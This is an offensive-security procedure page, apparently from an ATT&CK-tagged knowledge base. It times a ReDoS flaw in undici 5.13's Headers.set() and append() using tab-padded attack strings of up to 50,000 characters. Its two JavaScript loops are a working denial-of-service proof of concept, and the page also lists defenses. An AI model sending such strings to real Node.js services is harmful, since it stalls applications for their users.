---
tags:
  - dos
  - measurement
  - scaling
type: procedure
tools:
  - '[[tools/Node.js]]'
  - '[[tools/undici]]'
tactics:
  - '[[Impact]]'
commands:
  - '[[commands/scaled-redos-test-js]]'
platforms:
  - Node.js
  - JavaScript
techniques:
  - '[[Endpoint Denial of Service]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 2848d3d7-73ba-48d9-b7b6-a67237cbe1ee
created_at: '2025-12-14T17:26:36.590Z'
updated_at: '2025-12-14T17:26:36.590Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Impact]]'
mitre_techniques:
  - '[[Endpoint Denial of Service]]'
---
# Measure-and-Scale-DoS-Impact

## Summary

This procedure quantifies the ReDoS vulnerability by timing Headers.set() and append() with incrementally larger attack strings (0-50,000 tabs), illustrating quadratic time complexity and escalating delays from milliseconds to seconds.

## Description

By varying the repeat count in the attack string, this demonstrates how the regex backtracking worsens, leading to potential application immobilization. Useful for assessing impact in Node.js services handling untrusted headers, with outcomes showing delays up to 2.9s for 50k characters.

## Requirements

1. Vulnerable undici@5.13 installed
2. Node.js with performance.now() support
3. Script file for the loop execution

## Defense

Defensive measures and detection strategies:

- Implement request timeouts for header processing
- Profile applications with tools like Node.js inspector for regex hotspots
- Audit and refactor regex patterns to avoid ambiguity (e.g., use non-backtracking alternatives)

## Objectives

1. Measure execution times across input sizes
2. Confirm exponential DoS scaling
3. Provide evidence for vulnerability severity

## Instructions

### Step 1: Setup Loop for set()

**Context**: Test Headers.set() with scaling inputs to log times.

**Command** (JavaScript loop):
```javascript
console.log("Headers.set()");
for(let i = 0; i <= 5; i++) {
  const headers = new Headers();
  const attack = "a" + "\t".repeat(i * 10_000) + "\ta";
  const start = performance.now();
  headers.set("foo", attack);
  console.log(`${attack.length}: ${performance.now() - start}ms`);
}
```

> Runs tests. Expected output: Increasing times, e.g., 3: 0.5ms to 50003: 2645ms.

### Step 2: Repeat for append()

**Context**: Validate consistency across methods.

**Command** ([[commands/scaled-redos-test-js]]):
```javascript
console.log("\nHeaders.append()");
for(let i = 0; i <= 5; i++) {
  const headers = new Headers();
  const attack = "a" + "\t".repeat(i * 10_000) + "\ta";
  const start = performance.now();
  headers.append("foo", attack);
  console.log(`${attack.length}: ${performance.now() - start}ms`);
}
```

> Expected output: Similar escalating delays for append().

## MITRE ATT&CK Mapping

### Tactics

- [[Impact]]

### Techniques

- [[Endpoint Denial of Service]]

### Sub-Techniques


## Commands Used

- [[commands/scaled-redos-test-js]]

## Tools Used

- [[tools/Node.js]]
- [[tools/undici]]

## Tags

- dos
- measurement
